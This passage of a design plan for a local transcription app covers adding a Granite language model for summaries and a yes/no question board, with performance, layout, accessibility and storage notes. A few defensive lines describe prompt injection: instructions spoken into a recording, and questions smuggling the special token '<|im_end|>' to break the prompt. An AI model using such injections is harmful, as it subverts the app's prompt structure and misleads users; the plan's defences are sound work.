  - The transcript is data, not instructions: keep it in its user turn behind a delimiter, with the task in a separate turn. That separation is a weak control on its own. The real protection against instructions spoken into a recording is plain-text rendering (Security, rule 1).
- **`summarize_transcript(model, tokenizer, cache, prefix_ids) -> Summary`:**
  - Greedy `generate_step(mx.array(suffix), model, prompt_cache=cache, ...)`, `max_tokens=ANALYSIS_MAX_NEW_TOKENS`, continuing from the shared cache.
  - **Stop at end of turn yourself.** `generate_step` never stops on its own (see Model), so break out of the loop when a token is in `tokenizer.eos_token_ids`. Phase 0 confirms that `<|im_end|>` is in that set. Without this, every summary runs the full token budget and the JSON comes back followed by junk.
  - **Hitting `max_tokens` without an end-of-turn token is its own failure**, not bad JSON: raise `RuntimeError("The summary was cut off before it finished; try a shorter recording.")` with no retry, because a retry with the same budget would be cut off the same way.
  - **Update progress every 32 generated tokens** ("Summarising..."). Each update is a point where a rerun can stop generation, which can otherwise run for up to `ANALYSIS_MAX_NEW_TOKENS` tokens with no `st.*` call.
  - Afterwards, **trim the cache back to `len(prefix_ids)`**: `trim_prompt_cache(cache, cache[0].offset - len(prefix_ids))`. That removes the suffix and every generated token, so the questions start from the clean transcript cache. Read the length from `offset`; don't count tokens by hand. `generate_step` computes one step ahead of the token it yields, so the cache can hold one token more than the loop consumed. The retry below trims the same way.
  - Parse JSON: strip a ```json code fence if present, `json.loads`, validate the keys and types.
  - **One retry** on a parse or validation failure, appending the bad output plus a "return only valid JSON" turn. mlx-lm has no schema-constrained decoding as far as the planning session found; check `logits_processors` before building one.
  - If the retry also fails, raise `RuntimeError` with a readable one-liner, following the project's `RuntimeError` rule.
- **Before analysing, skip a blank transcript.** If the joined segment text is empty or whitespace (VAD found no speech, and the full-clip fallback transcribed nothing), don't load or run the LLM. Show `st.caption("No speech to analyse.")` in the analysis slot. Otherwise the model would summarise nothing and invent content.
- **Pre-check the length before loading the model.** Counting tokens needs the tokenizer, which comes with the 3.9 GB model, so a 3-hour recording would download and load the model only to be refused. First estimate from the word count (Phase 0 measured 1.072 tokens per word on app transcripts, against the ~1.3 typical of English BPE; the 3B shares the 8B's tokenizer). Refuse at once if the estimate is clearly over the limit (above 1.2 × `MAX_ANALYSIS_TOKENS`). Otherwise load the model and do the exact check below.
- **Limit check:** count the prompt's tokens first. Over `MAX_ANALYSIS_TOKENS`, raise `RuntimeError(f"Transcript is too long to analyse ({n} tokens; the limit is {MAX_ANALYSIS_TOKENS}).")`. Don't truncate silently: a summary of the first hour labelled as the whole thing is worse than none. Chunked map-reduce summaries are out of scope for v1.

### Data

- Extend `PipelineResult` with `segments: list[Segment]`, where `Segment` is `TypedDict(start: float, end: float, text: str)`, alongside the existing `transcript`.
  - Phase 1 joins the `text`s.
  - Phase 3 needs the segments individually.
  - The download and card keep using `transcript` unchanged.
- **This changes `TestRunPipeline`'s exact-key-set assertion** (`{"transcript"}`). Update it on purpose, to `{"transcript", "segments"}`, rather than loosening it.

### UI

- **Sidebar:** a second `_labeled_toggle("Transcript analysis", help=..., key="use_analysis", value=False)`. It's **off by default**, so the default app and its memory are unchanged. Three existing tests do change, on purpose (see the next bullet). Help text: "Summarises the transcript and answers yes/no questions with a local Granite 4.2 3B model (~4 GB download on first use)."
  - The sidebar model line gains a second `:small[]` line for `LLM_ID`, shown only when analysis is on. Keep `:small[]` rather than `st.caption`; see CLAUDE.md's contrast note.
  - **Existing tests to update deliberately**, not loosen:
    - `test_sidebar_holds_settings_and_app_info_only` counts markdown elements.
    - `tests/test_app_ui.py:221–222` assert that the toggle keys are exactly `{"use_segmentation"}` and that every toggle is on. Change them to `{"use_segmentation", "use_analysis"}`, with `use_segmentation` on and `use_analysis` off.
    - `tests/test_app_ui.py:255` asserts the same key set for the sidebar.
  - **Tell the user about the download before it happens.** When the toggle is on and the model isn't in the local cache (one `huggingface_hub.try_to_load_from_cache(LLM_ID, "model.safetensors", revision=LLM_REVISION)` check, which makes no network call with a full hash), show a caption in the input column: "The first analysis downloads the language model (about 4 GB)." The tooltip alone hides the size from anyone who doesn't hover.
- **Run order inside the existing `try`:**
  1. Decode.
  2. Speech model, then VAD.
  3. `run_pipeline`.
  4. **Store `result`/`result_stem` first.**
  5. **Draw the transcript card immediately** (see Performance), and above it an `st.skeleton` in the analysis slot, sized to the Analysis card's typical height so the transcript doesn't jump when the real card replaces it.
  6. Then, if analysis is on: spinner "Loading language model..." (`show_time=True`; a cold 3.89 GB fetch took 110 s in B3), then the progress bar through "Reading transcript (part i of n)..." (prefill chunks), "Summarising...", and "Answering question i of n...".

  Because the transcript is committed and shown before analysis starts, **an analysis failure must not lose the transcript.**
  - **Fire the "Transcription complete" toast before analysis starts**, not at the end of the run, so it can't be skipped by an analysis failure.
  - **The analysis stage gets its own error boundary**, inside the analysis slot: `except RuntimeError` shows `st.error(str(e))`, and `except Exception` shows `st.exception(e)`. Both stay in the analysis slot and neither returns from `main()`. Today `main()`'s outer `except Exception: st.exception(e); return` (`streamlit_app.py:963`) would otherwise catch an analysis error, end the run and hide the transcript's success.
  - **Turn known load failures into one-line errors.** First use offline, or the Hub unreachable, raises from `snapshot_download` (`OSError` / `huggingface_hub` errors, not `RuntimeError`). Map those to `RuntimeError("The language model isn't downloaded yet, and the Hugging Face Hub can't be reached.")`, alongside the disk-full mapping. Phase 0 step 8 records the exact exception types for both.
  - Pin all three with AppTests (see Tests).
  - Drawing the card mid-run changes the order of operations in `main()`: today every card is drawn in one block at the end of the script. Keep that block for reruns that don't run anything, and make sure a run draws the transcript card exactly once (an AppTest counts the subheaders after a run with analysis on).
- **Card:** render a second bordered card **above** the transcript card in `transcript_slot`, titled "Analysis". It goes above, not below, because a 20-minute transcript is about 200 lines, and a card below it is off screen on every display (see Layout across displays). The card shows:
  - Topic as a bold line.
  - Summary as text.
  - Topics as a small inline list.
  - Action items as a bulleted list.
  - **Every field the LLM generated is shown as plain text, never as Markdown** (see Security). The bold, the list and the bullets come from the app's own layout (e.g. `st.markdown("**Topic**")` as a fixed label, then `st.text(topic)`), never from inserting model text into a Markdown string. Escaping Markdown characters (`\`, `*`, `[`, `!`, `` ` ``, `<`) is acceptable where a field must sit inside Markdown, but `st.text` is the default.
  - No `st.success`/`st.warning` banner, following the transcript card's rule.
  - **Keep the slot's shape constant in every state** (see CLAUDE.md's Run feedback note: a card whose position changes is rebuilt from scratch). Reserve two placeholders at the top of `transcript_slot` on **every** rerun, analysis on or off: `feedback = transcript_slot.empty()` at index 0, as today, and `analysis_slot = transcript_slot.empty()` at index 1. The transcript card then always sits at index 2. Without the second placeholder, the transcript card would sit at index 1 with analysis off and index 2 with it on, and would be rebuilt every time the toggle changed. The skeleton, the Analysis card, the "Analyse" button, the "No speech to analyse" caption and analysis errors all go **into** `analysis_slot`. An emptied placeholder renders `display:none`, so it costs no layout. Pin the indexes with an AppTest in both toggle states.
- **Invalidation:**
  - `result` stays keyed by `_last_input_key` as today.
  - **Split the analysis into two keys**, so editing a question doesn't regenerate the summary, the slowest part (see Performance):
    - `summary` is keyed by `_last_input_key` alone.
    - `board` is keyed by `_board_key = (_last_input_key, questions_tuple)`.
  - Toggling analysis on, or editing questions, **after** a transcript exists must not re-transcribe. Show a secondary "Analyse" button (`type="secondary"`) in the analysis slot. It computes only what's missing: the summary if absent, and the board if the questions changed. A run that only needs the board still prefills the transcript, unless the cache is kept (Performance, item 3).
  - Pop `summary` and `board` whenever `_last_input_key` changes, in the same loop that pops `result`/`result_stem`. Pop `board` alone when the questions change.
- **Download (a decision, not an afterthought):** `<stem>_transcription.txt` stays unchanged. Analysis results live only in session state (see Storage), so without a second button a summary can't leave the app except by copy and paste. **B4 decided that it ships** (see Decisions after Phase 0). Originally: decide at the B4 decision point whether v1 ships a `<stem>_analysis.md` download (topic, summary, topics, action items, and the question board as a Markdown table), and record the choice here. The cost is one `download_button` in the Analysis card's header, laid out like the transcript card's, plus a formatter function with a unit test. If it ships, give it its own key (`dl_md`) and `on_click="ignore"`, for the same reasons as `dl_txt`.
- **Disk-full download:** if `load_llm` fails because the disk is full (the exception Phase 0 step 8 identifies), raise a one-line `RuntimeError` naming the model's size and the cache location ("Not enough disk space to download the language model (about 4 GB) to ~/.cache/huggingface/hub."). Don't leave a raw traceback. Show it in the analysis slot like any other analysis failure, so the transcript survives. A check before downloading (`shutil.disk_usage` against the size still to fetch) is optional. Catching the error is the part that's needed, because the disk can fill during the download.

## Phase 2: yes/no question board (whole transcript)

### Code

- **`DEFAULT_QUESTIONS`:** adapted from the Space's defaults, minus its joke "cats" question:
  - "Is the speaker asking a question?"
  - "Is the speaker making a decision?"
  - "Is the speaker angry or frustrated?"
  - "Does the speaker name a company, product or brand?"
  - "Does the speaker mention money or a price?"
  - "Does the speaker mention a person by name?"
  - "Does the speaker mention a date, a time or a deadline?"
  - "Does the speaker mention a place?"
  - "Does the speaker commit to doing something?"
- **`MAX_QUESTIONS`:** e.g. 20. The cost is a short forward pass per question, so it's a UI limit more than a speed one; set it from Phase 0's timing.
- **`_yes_no_ids(tokenizer) -> tuple[int, int]`:** resolve the answer tokens once at load and **assert each encodes to exactly one token.** Use the spelling Phase 0 confirmed (`"Yes"`/`"No"` expected).
- **`answer_questions(model, tokenizer, cache, prefix_ids, questions) -> list[tuple[str, float]]`:** always continues from the cache `prefill_transcript` returned (Phase 1). In a full analysis that's after `summarize_transcript` has trimmed it back to `len(prefix_ids)`; in a board-only re-run it's fresh from `prefill_transcript`. Building and checking the suffixes, and the fallback on a prefix mismatch, follow Phase 1's prompt layout.
  1. Assert `can_trim_prompt_cache(cache)` once up front.
  2. For each question:
     - Run its suffix (question turn plus `<|im_start|>assistant\n<think></think>`) once: `logits = model(suffix[None], cache=cache)[0, -1]`.
     - Compute `p_yes = softmax(logits[[yes_id, no_id]])[0]`.
     - Call `trim_prompt_cache(cache, len(suffix))` to restore the cache.
  3. Return the questions in **the user's order**. The UI sorts.
- **Prompt for each question:** a user turn of `f"Question: {q}\nAnswer with Yes or No only."` about "the transcript above".
  - Phase 0 may show a system turn or a different wording raises the Yes+No mass; tune there, not here.
  - Optional diagnostic: also compute and log the combined Yes+No mass and log a warning when it's below a threshold. Set the threshold from the evaluation's distribution of Yes+No mass on held-out answers, not a guessed 0.5.

### UI

- **Questions input:** a `st.text_area("Questions", value="\n".join(DEFAULT_QUESTIONS), help="One yes/no question per line.", key="questions", persist_state="session", max_chars=MAX_QUESTIONS * 200)` in the **input column**. `persist_state="session"` matters: without it Streamlit drops a widget's value whenever the widget isn't rendered, so toggling analysis off and back on would reset the questions to the defaults, and the board with them (`_board_key` changes). The text area sits inside an `st.expander("Analysis questions")` under the Transcribe button, shown only when analysis is on. It goes there because the run depends on it, and CLAUDE.md's layout rule keeps run inputs in main, not the sidebar.
  - Strip blank lines and drop duplicates (like the Space's `clean_nouls`).
  - Cap at `MAX_QUESTIONS` with an inline caption if the user goes over.
  - **Cap each question at 200 characters**, dropping longer lines with a caption naming how many were dropped. `max_chars` caps only the whole box.
  - **Reject any question containing `<|`.** The tokenizer turns special-token text such as `<|im_end|>` in user text into real control tokens, so a question could close its own turn and break the prompt's structure. Drop it with a caption ("1 question was skipped because it contains `<|`"), and unit-test that the remaining prompt contains no extra special tokens.
  - **Zero questions after cleaning:** don't run the board. Show `st.caption("Add at least one question to score.")` in its place. The "Analyse" button still computes the summary if that's missing.
- **Board,** inside the Analysis card under the summary:
  - One row per question, **sorted by P(yes), highest first**, each a label plus a bar.
  - Prefer `st.dataframe(..., column_config={"P(yes)": st.column_config.ProgressColumn(min_value=0, max_value=1, format="%.2f")}, hide_index=True)`, which is one element and easy to test. Check it at every card width in Layout change 3 before settling on it over per-row `st.progress`.
  - **Theme the dataframe in the same commit** that adds it. Until then `config.toml` has no dataframe keys, following its rule of theming only what the app renders. Add two keys per mode, each copying an existing token in that mode, so the board's colours match the rest of the app in light and dark alike:

    | Key | `[theme.dark]` | `[theme.light]` | Why |
    |---|---|---|---|
    | `dataframeHeaderBackgroundColor` | `#262626` (Gray 90, `$layer-01`) | `#f4f4f4` (Gray 10, `$layer-01`) | Streamlit draws header text at 60% of `textColor`. On Carbon's own data-table header (`$layer-accent-01`: `#393939` dark, `#e0e0e0` light) that's 4.27:1 / 4.30:1, below 4.5. On `$layer-01` it's **5.09:1 / 4.58:1**, and the header steps off the page by 1.20:1 / 1.10:1, the same step as the sidebar and dropzone. The stock header (`bgMix`, `#1e1e1e` / `#fafafa`) is readable but steps off the page by only 1.09:1 / 1.04:1, so it barely shows. |
    | `dataframeBorderColor` | `#525252` (`borderColor`) | `#c6c6c6` (`borderColor`) | Once `borderColor` is set, Streamlit derives the dataframe border as that colour at 45% opacity: 1.39:1 dark, 1.26:1 light, fainter than the card it sits in. Setting it to `borderColor` gives the board the card's own edge, 2.32:1 / 1.71:1. |

    These ratios were computed from the colour values, not measured in a browser (2026-10-17, Streamlit 1.64.0). They assume the derivations read from the bundled frontend (header text = `fadedText60`, the derived border at 45% opacity). Check them in the rendered app at both modes before committing, and write the confirmed figures as inline comments on the keys, as every existing colour line has. Then update the "no chart, dataframe, metric or code keys" sentence in `config.toml`'s header comment and in CLAUDE.md's Configuration section.
  - **The bars need no key.** The dataframe takes its accent from `primaryColor`, so Blue 60 fills the P(yes) bars: 3.62:1 on the dark page and 5.0:1 on white, both above the 3:1 needed for non-text graphics. The number is printed beside each bar (`format="%.2f"`), so the value never depends on colour alone.
  - **No 0.5 "yes" verdict and no colour flip.** The base instruct model isn't the Space's trained `decision` adapter, so its probabilities are less calibrated; present them as a ranking.
  - **The caption under the board** (canonical text): "Sorted by P(yes), highest first. Scores rank the questions; they aren't verdicts." Stating the sort order is also an accessibility rule (Accessibility, rule 2).
- **Progress:** "Answering question i of n" through the same `feedback` progress bar, following `on_progress`'s before-each-unit contract.

## Phase 3 (optional, gated on Phase 0 timing): per-segment answers

**Not in v1: B4 measured 1.66 s per segment on the 3B (~113 s for a 32-minute meeting) and skipped it.** Kept below for a later revisit.

- For each VAD segment, compute that segment's text into a fresh cache, then ask the questions as in Phase 2.
- Result: a segment × question matrix of P(yes).
- UI: for a chosen question (a `st.selectbox` in the card), list the segments whose P(yes) is highest, as `[M:SS - M:SS] 0.91 text…`, linked to the timestamps the transcript already shows.
- Also opens per-segment sentiment for free, e.g. "Is the speaker angry or frustrated?" per segment.
- Cost is segments × questions short forward passes. Each is bound by memory bandwidth (reading roughly 5 GB of weights per pass), so it may be about 25 ms per pass on an M2 Pro. **That figure is an estimate, not a measurement.** If Phase 0 shows it's too slow, batch the questions along the batch axis over a copied cache, or skip the phase.
- VAD off yields one segment, so Phase 3 collapses to Phase 2. Hide the selector then.

## Performance

The rule throughout: **process the transcript once, show results as soon as they exist, and say in advance what "fast enough" means.**

### Budgets

These are for a 16 GB M2 Pro, warm (the model already loaded), with a 30-minute transcript of about 8K tokens. They're **targets, not measurements**. Phase 0 checks each one, and the decision point acts on any that are missed.

| Measure | Budget | Why |
|---|---|---|
| Whole-process peak memory, speech model and LLM both resident | ≤ ~10 GB | Leaves room for the OS, the browser and Streamlit on 16 GB, and for macOS's limit on how much memory the GPU may use |
| Full analysis (prefill + summary + 10 questions) | ≤ ~30 s | About as long as someone will watch a progress bar after the transcript is already on screen |
| Each extra question | ≤ ~0.5 s | Editing a question should feel immediate (Phase 0 step 6) |
| Board-only re-run after editing questions | ≤ the prefill time | Must not include regenerating the summary (item 4) |

Record the measured figures next to the budgets in CLAUDE.md, in the same style as the TurboCTC memory series.

### Design

1. **One prefill for everything** (Phase 1, prompt layout). The summary and the questions share one opening: a system turn plus the transcript turn. The transcript is processed once, the summary is generated from that cache and trimmed back, and the questions continue from the same cache. For a long transcript the prefill is the dominant cost, so this roughly halves analysis time compared with separate summary and question prefills. That figure is an estimate; Phase 0 step 9 measures it.
2. **Show the transcript first** (Phase 1, run order). The transcript card is drawn as soon as transcription finishes, with an `st.skeleton` holding the Analysis card's space above it. The total time is unchanged, but the wait for the *transcript* is no longer extended by the analysis. Holding the space with a skeleton keeps the layout rule that the transcript doesn't jump.
3. **Optionally keep the cache between reruns.** Keeping the transcript's KV cache in session state (with `_last_input_key`) would let edited questions skip the prefill entirely. It costs about 160 KB per token on the 8B, 80 KB on the 3B (about 0.5 GB for a 30-minute transcript, 2 GB at `MAX_ANALYSIS_TOKENS`) for as long as the session lasts, which is a lot on 16 GB. **Default: don't keep it** — and B4 decided not to (see Decisions after Phase 0). If it ships, pop it with `summary`/`board` and never keep more than one.
4. **Split cache keys** (Phase 1, Invalidation). `summary` is keyed by the input and `board` by the input plus the questions, so editing a question never regenerates the summary.
5. **Free MLX's buffer cache between stages** (Phase 0 step 9). MLX keeps freed GPU memory in its own cache for reuse, so after transcription that memory is unavailable to the LLM until it's released. `mx.clear_cache()` before the LLM loads is the first thing to try. Evicting the speech model (Risks) is the more expensive option, since it costs a reload on the next Transcribe.
6. **One inference at a time.** Each browser tab runs in its own thread, and every tab shares the one cached model. Two analyses at once would double the KV memory, and running one MLX model from two threads at once is untested. Guard inference with a process-wide `threading.Lock` created in an `@st.cache_resource` function. Cover TurboCTC's `run_pipeline` call with the same lock, since it has the same exposure today.
   - **The lock covers inference only, never model loading.** A first-use download held under the lock would block transcription in every other tab for minutes.
   - **Wait in a loop:** `while not lock.acquire(timeout=0.5): placeholder.caption("Waiting for another analysis to finish...")`. A bare `acquire()` blocks with no `st.*` call, so a waiting tab couldn't be stopped by a rerun. Each caption update gives it that chance.
   - **Release with `with lock:` or `try/finally`.** Streamlit's stop and rerun signals derive from `BaseException`, so `except Exception` doesn't catch them, but `finally` still releases the lock. Phase 0 step 9 decides whether this is needed or merely cautious; either way, keep it if it costs nothing measurable.
7. **Progress that can stop.** Streamlit only stops a script at its next `st.*` call. Updating progress before each prefill chunk (2,048 tokens), every 32 generated summary tokens, and before each question gives a widget click a chance to stop a long analysis within one chunk or 32 tokens. An interrupted run leaves its local cache to be garbage-collected. If item 3 (keeping the cache) ships, store the cache in session state **only after a clean trim**, so an interrupted run can never leave a half-trimmed cache for the next rerun to reuse. The bar also moves during the prefill instead of freezing on one label.
8. **Speed regression check.** The evaluation script (see Evaluation) also records prefill tokens/s and total analysis time, so a dependency or revision change that slows things down gets noticed along with one that lowers quality.

### Tests

- **One prefill:** a unit test with a counting fake model asserting that a full analysis (summary + N questions) calls the prefill exactly once.
- **Trim after summary:** extend the contract cache-equivalence test (tiny random Granite model): after generating a summary from the shared cache and trimming back to `len(prefix_ids)`, a question's logits equal those from a fresh prefill. Drop the trim, and it fails.
- **Split keys:** an AppTest that edits the questions after an analysis and asserts the summary generator isn't called again while the board is recomputed.
- **Single transcript card:** an AppTest with analysis on that asserts exactly one "Transcription" subheader after the run (the early draw must not leave a duplicate).
- **Lock:** a unit test that the inference lock is the same object across calls (it's created in `@st.cache_resource`) and is held around the model calls.

## Layout across displays

**Constraint:** Streamlit doesn't tell the Python side how wide the browser is (`st.context` has no viewport width). So there is one layout for every display, and it adapts only through what the browser does with it:
- the sidebar becomes an overlay at ≤768 px;
- `st.columns` stack at ≤640 px;
- horizontal containers wrap;
- a `width=` cap never exceeds the space available.

Design for those behaviours, not for breakpoints the app can't detect. This is a local Mac app, so the displays that matter are Mac screens and window sizes, not phones.

**Measured on 2026-10-17** (Streamlit 1.64.0, empty state, dark theme). The app was loaded in same-origin iframes of exact widths, because Chrome wouldn't resize its maximized window, and element widths were read with `getBoundingClientRect`. The format list is the dropzone's "500MB per file • WAV, FLAC, … MKV" line, which needs 415 px to show in full.

| Browser width | Sidebar | Input column | Transcript column (card) | Format list visible |
|---|---|---|---|---|
| 600 | overlay (auto-collapsed) | 568, stacked above | 568, stacked below | all |
| 760 | overlay (auto-collapsed) | 275 | 421 | 249 of 415 px |
| 1024 | open, 300 | **210** | **322** | 184 of 415 px |
| 1024 | collapsed | 330 | 502 | not measured |
| 1470 (MacBook Air 13" default) | open | 388 | 590 | **253 of 415 px** |
| 1470 | collapsed | 508 | 770 (card 720) | 373 of 415 px |
| 1920 | open | 568 | 860 (card 720) | all |
| 1920 | collapsed | 688 | 1040 (card 720) | all |
| 2560 | open | 824 | 1244 (card 720) | all |
| 2560 | collapsed | 944 | 1424 (card 720: 704 px empty beside it) | all |
| 3440 | open | 1176 | 1772 (card 720) | all |
| 3440 | collapsed | 1296 | 1952 (card 720: 1232 px empty beside it) | all |

What the measurements changed, compared with the estimates:
- **The most cramped width isn't the half-screen window.** It's 769–~1200 px with the sidebar open. The sidebar only becomes an overlay at ≤768 px, so at 1024 px it still takes 300 px, leaving a 210 px input column and a 322 px transcript, about 40 characters a line. At 760 px the sidebar is an overlay, so the columns are wider (275 / 421).
- **On the most common laptop setup (1470 px, sidebar open) the format list is cut off.** It shows 253 of 415 px, "WAV, FLAC, M4A, MP3, O…", so none of the video formats are visible. It's cut off at 1470 with the sidebar collapsed too. Above 640 px it shows in full only once the dropzone is about 568 px wide, which today means 1920 px or more. CLAUDE.md's reason for giving the uploader no `help=` tooltip ("the dropzone lists the accepted extensions itself") therefore doesn't hold at laptop widths.

### Changes

1. **Cap and centre the whole layout on large displays.** This is its own commit, before Phase 1: `feat(ui): cap the layout width on large displays`.
   - Wrap the title and the grid in `st.container(width=LAYOUT_MAX_WIDTH_PX)`, inside an outer `st.container(horizontal_alignment="center")`.
   - Start at `LAYOUT_MAX_WIDTH_PX = 1280`. With `[2, 3]` and the medium gap that gives an input column of about 500 px and a transcript column of about 760, so the 720 px card nearly fills its column instead of leaving a 704–1232 px gap beside it (measured at 2560 and 3440). The cap also limits the dropzone to about 500 px on every large display, below the ~568 px the format list needs, so change 5 has to land first (A4 before A6).
   - Below 1280 px the cap has no effect, so laptops look exactly as they do now. Keep `TRANSCRIPT_MAX_WIDTH_PX` as the reading-width cap inside it.
   - Rejected: `layout="centered"`. Its ~736 px limit is too narrow for two columns, and the old centred layout was what the wide grid replaced.
   - Cost: every element in main moves one level deeper. `test_sidebar_model_line_names_the_loaded_model` reads the page structure (`title, grid = at.main.children.values()`) and must read it through the wrapper instead. Other tests that walk `at.main` by index need checking too. Add an AppTest that pins the wrapper's width the way the transcript slot's is pinned (`proto.width_config.pixel_width`).
2. **Analysis above the transcript** (Phase 1, Card). Reading order is then summary first, full text after, at every width, and in a narrow window it becomes input → summary → transcript.
   - Nothing jumps during a Transcribe run: the transcript card is drawn as soon as transcription ends, with an `st.skeleton` above it holding the Analysis card's height (Phase 1, run order).
   - With the later "Analyse" button, the transcript moves down once, in direct response to that click.
   - The `feedback` placeholder stays first in the slot.
   - Rejected: tabs ("Transcript" | "Analysis"), which hide one or the other and add a second selected-tab label at 3.6:1 in dark mode. Also rejected: the input column, which is too narrow for the question board up to about 1100 px of main area.
3. **The question board at narrow widths.**
   - Give the `ProgressColumn` `width="small"` so the question text gets the rest of the row.
   - Dataframe cells cut long text short rather than wrapping it. The card is 590 px on a 1470 px laptop with the sidebar open, 421 at 760 px and 322 at 1024 px with the sidebar open, so check the board at all three as well as at 720.
   - At 322 px a question of about 45 characters plus a bar won't fit on one row, so expect to need one `st.progress(p, text=f"{question}: {p:.2f}")` per row there: its label wraps, and the number in it is what a screen reader reads (Accessibility, rule 1). Decide from the render.
4. **The 769–~1200 px band with the sidebar open** is the tightest: a 210 px input column and a 322 px transcript at 1024. The input column holds the tabs, dropzone, recorder, player, Transcribe button and, later, the questions expander.
   - In the empty state, the tabs, Upload button and Transcribe button all fit at 210 px. Render the loaded state and the questions expander there before changing anything.
   - A ratio change doesn't help here: `[1, 1]` gives 266 / 266, which shrinks the transcript to buy a wider input column. Collapsing the sidebar is the fix, and it's one click (330 / 502 measured).
   - Don't default the sidebar to collapsed (`initial_sidebar_state="collapsed"`). It holds the "English only" cue, which CLAUDE.md calls essential, and today it collapses itself only at ≤768 px.
5. **Keep the accepted formats readable** (its own commit, landing before change 1: A4, then A6 in Order of work; `fix(ui): keep the accepted formats readable at laptop widths`). Streamlit generates the dropzone's text from `type=` and offers no way to wrap or reword it, so the fix goes outside the dropzone.
   - Recommended: an `st.caption` directly under the uploader, e.g. "Audio: WAV, FLAC, M4A, MP3, OGG, AAC · Video: MP4, MOV, WEBM, MKV". A caption wraps, and it's readable on the page at 5.6:1 dark / 4.7:1 light. It repeats the list at ≥1920 px, where the dropzone shows it in full, which is an acceptable cost for one line at every other width.
   - Build the caption from `SUPPORTED_FORMATS` and `VIDEO_FORMATS` rather than typing the list out, so it can't drift from what the uploader accepts. Pin it with an AppTest.
   - Rejected: a visible uploader label with `help=`. The list would move into a hover tooltip, which a keyboard or screen-reader user may never reach.
   - Then correct CLAUDE.md's statement that the dropzone lists the extensions itself.

### Verification

- **Method that worked:** serve the app headless and, from a page on the same origin, load it into `<iframe>`s of exact widths, then read `getBoundingClientRect()` inside each. A same-origin frame can be read with JavaScript, and the page lays itself out to the frame's width. Use this rather than resizing Chrome, which reported success but didn't change the maximized window's width. Collapse or open the sidebar inside each frame by clicking `stSidebarCollapseButton` / `stExpandSidebarButton`.
- Done: the empty state at 600, 760, 1024, 1470, 1920, 2560 and 3440 px, with and without the sidebar, dark theme (the table above).
- Still to do: the audio-loaded state, a finished run with analysis on, and the light theme. Do the cap and format-list commits' renders before and after each change.
- Record the measured widths in CLAUDE.md's UI Layout section, replacing "the narrow cases … were not rendered".

## Accessibility

The theme already sets colour contrast (every text pair ≥ 4.5:1, measured; see `config.toml`). These notes cover what contrast doesn't: whether the Analysis card works for a keyboard user and a screen-reader user. They apply to B7.

### Rules

1. **The board is readable without the bars.** Streamlit's `st.dataframe` draws its cells on a canvas and exposes the data to assistive technology through a separate hidden structure. Whether VoiceOver reads a `ProgressColumn` cell's number, or only the question, is **unverified**. The number is already printed next to the bar (`format="%.2f"`), so check that it's read out. If it isn't, use the per-row `st.progress(p, text=f"{question}: {p:.2f}")` fallback from Layout change 3: a native progress element exposes its value, and the text label carries the number as well.
2. **Say how the board is sorted.** The caption under the board starts with "Sorted by P(yes), highest first." (Phase 2, UI, holds the canonical text.) A sighted user sees the order from the bar lengths; a screen-reader user only learns it if it's stated.
3. **Headings and reading order match the screen.** The Analysis card has its own `st.subheader("Analysis")`, like the transcript card's "Transcription", so VoiceOver's heading list jumps between the two. Because the Analysis card is drawn above the transcript card in the page structure (Layout change 2), the reading order matches the screen. Never reorder the cards visually with CSS.
4. **Completion is announced, not just shown.** The transcript's only completion signal is a toast, and the Analysis card adds no `st.success` banner. Add `st.toast("Analysis complete", icon=":material/check_circle:")` after a successful analysis, matching the transcript's. Verify that VoiceOver announces both toasts; if it doesn't, note it in CLAUDE.md as a known gap rather than adding a visible banner, which the card rules forbid.
5. **Labels that name the thing.** Every input keeps a real label:
   - the questions box: "Questions", visible, with its help text;
   - the expander: "Analysis questions";
   - the "Analyse" button: that word;
   - the analysis download, if it ships: a real label (e.g. "Download"), not `""`. CLAUDE.md records why: an empty label leaves the button's name to its icon's internal text.
6. **Keyboard only.** Every analysis control is a native button, text area or expander, so it's reachable with Tab. Check that the order follows the screen: input column, then the Analysis card, then the transcript card. Check also that the "Analyse" button can be reached without passing through the whole transcript.
7. **Motion.** `st.skeleton` animates. Check that it respects the macOS "Reduce motion" setting. If it doesn't, use a plain caption ("Analysing...") in the reserved space instead of the animation.
8. **No meaning by colour alone.** This is already a rule (no 0.5 colour flip on the board). Keep it if Phase 3 adds per-segment highlighting: a highlighted segment also shows its number.

### Verification

- **VoiceOver walk-through** (macOS, Cmd+F5), in Safari and Chrome, after B7. Go through, in screen order (rule 6): tabs → uploader → Transcribe → the questions expander → the Analysis card (its heading, the "Analyse" button when shown, summary, topics and action items) → the board (each row's question and number) → the transcript card. Record what was read and anything skipped in CLAUDE.md's UI Layout section.
- **Keyboard-only run:** transcribe and analyse the fixture without the mouse.
- **Automated:** an AppTest that the Analysis card has a "Analysis" subheader before the transcript card's "Transcription", and that the board caption starts with "Sorted by P(yes)". The rest needs a real screen reader, which no test here can stand in for.

## Storage

The app keeps nothing on disk except model weights, and this plan keeps it that way.

- **Model weights** go in the Hugging Face cache (`~/.cache/huggingface/hub`, or `HF_HOME` if set). The LLM adds 3.89 GB (the 3B q8 chosen at B4; its snapshot measures 3.6 GiB with `du -L`) to the existing TurboCTC (~0.9 GB) and MLX VAD (1.2 MB). The app never deletes anything from the cache.
- **Old revisions pile up.** A pinned revision guards reproducibility but never cleans up: when a pin moves, the old snapshot stays. On 2026-10-17 the cache held an unpinned TurboCTC snapshot (`947f59a…`) next to the pinned `2864561…`, and a weightless `granite-4.2-8b-q8-mlx` entry (7 MB: tokenizer and config, with 79-byte placeholder files where the safetensors weights should be) left over from the planning session. **Rule:** whenever you change `MODEL_REVISION`, `MLX_VAD_REVISION` or `LLM_REVISION`, delete the old revision from the cache in the same session, after the new one has loaded and its tests pass. Add the rule to CLAUDE.md beside the revision notes. Notes on `hf cache rm` (huggingface_hub 1.32.0; A5 moves it to 2.2.0, so re-check the subcommands and output after Step 0):
  - It takes a repo (`model/<org>/<name>`) or a bare revision hash. Always run it with `--dry-run` first.
  - The dry run's size total is **not** the space freed. It reported 9.3 GB for those two entries: 947 MB for `947f59a`, which shares every weights file with the pinned revision, and the q8 model's full listed size even though no weights were downloaded. Only files no remaining revision uses are actually deleted, and those two entries free about 7 MB.
  - The real deletion prints the same inflated number ("Saved 9.3G"), so measure with `du` before and after rather than trusting it.
  - Afterwards, check the pinned snapshot with `hf cache verify <repo> --revision <hash>`. For TurboCTC it checks 11 files and warns that 3 remote files are missing locally. That warning is expected: `mlx_audio` downloads only the files it needs, and the pinned snapshot never had `model.sig`, `README.md` or `.gitattributes`.
- **Uploads and recordings** stay in memory (`io.BytesIO`, no temp files). Unchanged by this plan: the LLM reads the transcript string from session state, never from a file.
